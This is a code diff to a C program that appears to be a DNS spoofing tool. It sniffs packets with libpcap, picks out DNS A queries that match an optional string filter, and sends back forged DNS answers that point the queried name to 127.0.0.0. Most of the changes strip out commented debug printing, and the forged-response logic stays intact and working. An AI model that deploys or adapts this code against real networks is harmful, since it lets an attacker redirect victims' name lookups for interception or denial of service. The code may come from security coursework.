@@ -238,7 +238,7 @@ void send_forged_dns_response(unsigned long destination_address, u_int16_t desti
 	}
 	close(sd);
 }
-void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *size_payload, u_char* stringExpression)
+void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload, u_char* stringExpression)
 {
 	const struct sniff_ip *ip;              /* The IP header */
 
@@ -329,30 +329,18 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 				struct dns_answer_data_1* answer_data1;
 				answer_data1 = (struct dns_answer_data_1*)(datagram + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header) \
 						    + strlen(domain) + 1 + sizeof(struct dns_answer_data));
-				answer_data1->name = htons(49164);
+				answer_data1->name = htons(49164);  // c0 0c
 				answer_data1->type = query->type;
 				answer_data1->class = query->class;
 				answer_data1->ttl = htonl(600); // Keeping a 
 				answer_data1->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
 				answer_data1->rdata = htonl(2130706432);  // 127.0.0.0
 
-				//sprintf(args + strlen(args), " %s:%d ->", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
-				//sprintf(args + strlen(args), " %s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));
-
-				// Checking for DNS queries only of the type A and class INTERNET
 				if(ntohs(query->type) != 1 || ntohs(query->class) != 1)
 				    return;
 
 				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){
-				    /*sprintf(args + strlen(args), " IP_length in hex %d", size_of_forged_dns_response);
-				    sprintf(args + strlen(args), " Payload (%d bytes):", *size_payload);
-				    printf("%s\n", args);
-				    print_payload(*payload, *size_payload);
-				    printf("Response Start\n");
-				    u_char *pay1 = (u_char*)datagram;
-				    print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
-					+ strlen(domain) + 1 + sizeof(struct dns_answer_data) + sizeof(struct dns_answer_data_1));
-				    printf("Response End\n");*/
+
 				    send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, size_of_forged_dns_response);
 				}
 			}
@@ -373,53 +361,18 @@ got_packet(u_char *stringExpression, const struct pcap_pkthdr *header, const u_c
 
 	int size_payload;
 	u_char *payload;
-
-	char args[1000];
-	//sprintf(args, "\nPacket number %d:\n", count);
 	count++;
 	
-	char buffer[26];
-	struct tm* tm_info;
-	tm_info = localtime(&header->ts.tv_sec);
-	//strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
-	//sprintf(args, "%s.%06u ", buffer, header->ts.tv_usec);
-
-   	//ts_print(&(header->ts));
-
-	/* define ethernet header */
 	ethernet = (struct ether_header*)(packet);
 	
-	/*sprintf(args, "%02x:%02x:%02x:%02x:%02x:%02x", ethernet->ether_shost[0],
-									ethernet->ether_shost[1],
-									ethernet->ether_shost[2],
-									ethernet->ether_shost[3],
-									ethernet->ether_shost[4],
-									ethernet->ether_shost[5]); */
-
-	//sprintf(args + strlen(args), " -> ");
-
-	/*sprintf(args + strlen(args), "%02x:%02x:%02x:%02x:%02x:%02x", ethernet->ether_dhost[0],
-									ethernet->ether_dhost[1],
-									ethernet->ether_dhost[2],
-									ethernet->ether_dhost[3],
-									ethernet->ether_dhost[4],
-									ethernet->ether_dhost[5]); */
-	//sprintf(args + strlen(args), " ethertype ");
 	switch(ntohs(ethernet->ether_type))
 	{
 		case ETHERTYPE_IP:
-			//sprintf(args + strlen(args), "IPv4 ");
-			//sprintf(args + strlen(args), "(0x%x)", ntohs(ethernet->ether_type));
-			//sprintf(args + strlen(args), " length %u", header->len);
-			print_ip_packet(args, packet, &payload, &size_payload, stringExpression);
+			print_ip_packet(packet, &payload, &size_payload, stringExpression);
 			break;
 		default:
 			break;
 	}
-	/*
-	 * Print payload data; it might be binary, so don't just
-	 * treat it as a string.
-	 */
 }
 
 int main(int argc, char **argv)
